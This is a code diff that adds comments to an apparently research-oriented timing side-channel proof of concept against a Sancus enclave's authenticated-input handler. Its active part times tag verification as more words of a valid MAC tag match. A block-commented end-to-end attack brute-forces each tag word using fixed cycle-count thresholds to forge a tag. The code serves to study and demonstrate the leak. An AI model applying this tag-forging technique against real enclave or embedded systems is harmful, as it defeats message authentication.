@@ -106,76 +106,92 @@ int main()
     puts("[untrusted] calling ping SM..");
     // enter_ping();
 
+    // Measure timer overhead.
     uint tsc1, tsc2;
     timer_tsc_start();
     tsc1 = timer_tsc_end();
     pr_info1("tsc overhead: %u\n", tsc1);
-    uint8_t __attribute__((aligned(2))) cipher[DATA_SIZE] = {0xAB, 0xCD};
-    uint8_t __attribute__((aligned(2))) data[DATA_SIZE] = {0xAB, 0xCD};
+
+    // ========================= Proof of concept attack =========================
+    // Initilize the guess buffer to zero.
     uint8_t __attribute__((aligned(2))) guess[DATA_SIZE + SANCUS_TAG_SIZE] = {0x0};
+    // Set data buffer to some value you want to send.
+    uint8_t __attribute__((aligned(2))) data[DATA_SIZE] = {0xAB, 0xCD};
+    // Set payload buffer to zero, it will be filled with the wrapped data.
     uint8_t __attribute__((aligned(2))) payload[DATA_SIZE + SANCUS_TAG_SIZE] = {0x0};
     
+    // Set nonce to zero, this helps us for the proof of concept but is not needed in the end-to-end attack.
     uint16_t nonce_rev = ((unsigned) 0) << 8 | ((unsigned) 0) >> 8;
+    // Wrap the data with the key and nonce, output in the authentic execution framework is handled this way.
+    // This gives us the cipher and tag we want to guess.
     sancus_wrap_with_key(key, &nonce_rev, sizeof(nonce_rev), data, DATA_SIZE, payload, payload + DATA_SIZE);
     dump_buf(payload, DATA_SIZE + SANCUS_TAG_SIZE, "\tpayload");
-    // __sm_pong_handle_input(CONN_ID, payload, DATA_SIZE + SANCUS_TAG_SIZE);
-
+    
+    // Set the first part of the guess buffer to the cipher we know the tag for.
     for( int i = 0; i < DATA_SIZE; i++ ){
         guess[i] = payload[i];
     }
+    // This loop shows the timing difference for variable numbers of matching initial bytes.
     for ( int e = 0; e <= SANCUS_TAG_SIZE/2; e++ ){
-        
+        // Time execution of HandleInput with the current guess.
         timer_tsc_start();
         __sm_pong_handle_input(CONN_ID, guess, DATA_SIZE + SANCUS_TAG_SIZE);
         tsc2 = timer_tsc_end();
         dump_buf(guess, DATA_SIZE+SANCUS_TAG_SIZE, "\tguess");
         pr_info1("Time to verify guess: %u\n", tsc2);
+        // Change one word of the guess buffer to the correct tag value.
         guess[DATA_SIZE+2*e] = payload[DATA_SIZE+2*e];
         guess[DATA_SIZE+2*e+1] = payload[DATA_SIZE+2*e+1];
     }
-
+    
+    /* 
     // ========================= END-TO-END ATTACK =========================
-    // for( int i = 0; i < DATA_SIZE; i++ ){
-    //     guess[i] = cipher[i];
-    // }
+    // Set the first part of the guess buffer to the cipher to a random value.
+    uint8_t __attribute__((aligned(2))) cipher[DATA_SIZE] = {0xAB, 0xCD};
+    for( int i = 0; i < DATA_SIZE; i++ ){
+        guess[i] = cipher[i];
+    }
 
-    // uint time_constant =
-    //     #if SANCUS_KEY_SIZE == 8
-    //         1042    ;
-    //     #else
-    //         2211;
-    //     #endif
-    // uint time_constant2 =
-    //     #if SANCUS_KEY_SIZE == 8
-    //         93;
-    //     #else
-    //         173;
-    //     #endif
+    // Constants used to determine the number of matching initial words.
+    uint time_constant =
+        #if SANCUS_KEY_SIZE == 8
+            1042    ;
+        #else
+            2211;
+        #endif
+    uint time_constant2 =
+        #if SANCUS_KEY_SIZE == 8
+            93;
+        #else
+            173;
+        #endif
 
-    // for ( int e = 0; e < SANCUS_TAG_SIZE/2; e++ ){
-    //     for( int i = 0; i < 256; i++ ){
-    //         guess[DATA_SIZE+2*e] = i;
-    //         for( int j = 0; j < 256; j++ ){
-    //             guess[DATA_SIZE+2*e+1] = j;
-                
-    //             timer_tsc_start();
-    //             __sm_pong_handle_input(CONN_ID, guess, DATA_SIZE + SANCUS_TAG_SIZE);
-    //             tsc2 = timer_tsc_end();
-    //             if( tsc2 > time_constant + e*time_constant2 ){
-    //                 dump_buf(guess, DATA_SIZE+SANCUS_TAG_SIZE, "\tguess");
-    //                 pr_info1("Time to verify guess: %u\n", tsc2);
-    //                 break;
-    //             }
-    //         }
-    //         pr_info1("Finished %d/256\n", i+1);
-    //         if( tsc2 > time_constant + e*time_constant2 ){
-    //             dump_buf(guess, DATA_SIZE+SANCUS_TAG_SIZE, "\tguess");
-    //             pr_info1("Time to verify guess: %u\n", tsc2);
-    //             break;
-    //         }
-    //     }
-    //     pr_info1("Finished %d/8\n", e+1);
-    // }
-
+    // Loop over the tag words and try to guess them one by one.
+    for ( int e = 0; e < SANCUS_TAG_SIZE/2; e++ ){
+        for( int i = 0; i < 256; i++ ){
+            guess[DATA_SIZE+2*e] = i;
+            for( int j = 0; j < 256; j++ ){
+                guess[DATA_SIZE+2*e+1] = j;
+                // Measure the time it takes to verify the guess.
+                timer_tsc_start();
+                __sm_pong_handle_input(CONN_ID, guess, DATA_SIZE + SANCUS_TAG_SIZE);
+                tsc2 = timer_tsc_end();
+                // If the time is greater than a threshold, we assume the guess is correct.
+                if( tsc2 > time_constant + e*time_constant2 ){
+                    dump_buf(guess, DATA_SIZE+SANCUS_TAG_SIZE, "\tguess");
+                    pr_info1("Time to verify guess: %u\n", tsc2);
+                    break;
+                }
+            }
+            pr_info1("Finished %d/256\n", i+1);
+            if( tsc2 > time_constant + e*time_constant2 ){
+                dump_buf(guess, DATA_SIZE+SANCUS_TAG_SIZE, "\tguess");
+                pr_info1("Time to verify guess: %u\n", tsc2);
+                break;
+            }
+        }
+        pr_info1("Finished %d/8\n", e+1);
+    }
+    */
     FINISH();
 }
